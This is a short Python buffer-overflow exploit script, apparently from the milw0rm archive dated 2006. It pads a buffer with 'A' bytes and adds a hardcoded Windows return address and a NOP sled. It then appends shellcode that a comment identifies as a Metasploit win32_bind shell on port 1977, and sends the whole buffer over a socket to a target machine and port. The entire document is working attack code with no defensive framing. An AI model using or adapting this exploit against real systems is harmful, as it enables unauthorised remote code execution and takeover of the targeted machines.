#!/usr/bin/python
from payload import buf
import socket

def shell_attack(target_machine, target_port):
   

#/* win32_bind -  EXITFUNC=thread LPORT=1977 Size=317 Encoder=None http://metasploit.com */

  

   buff = b"A" * 1055
   buff = buff + b"\x0A\xAF\xD8\x77"
   buff = buff + b"yyyy"
   buff = buff + b"\x90" * 4
   buff = buff + buf
   buff = buff + b"B" * 19021 + b"\r\n"

   sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   sock.connect((target_machine, target_port))
  

   sock.send(buff)
  

   sock.close()
   sock = None           





# milw0rm.com [2006-05-15]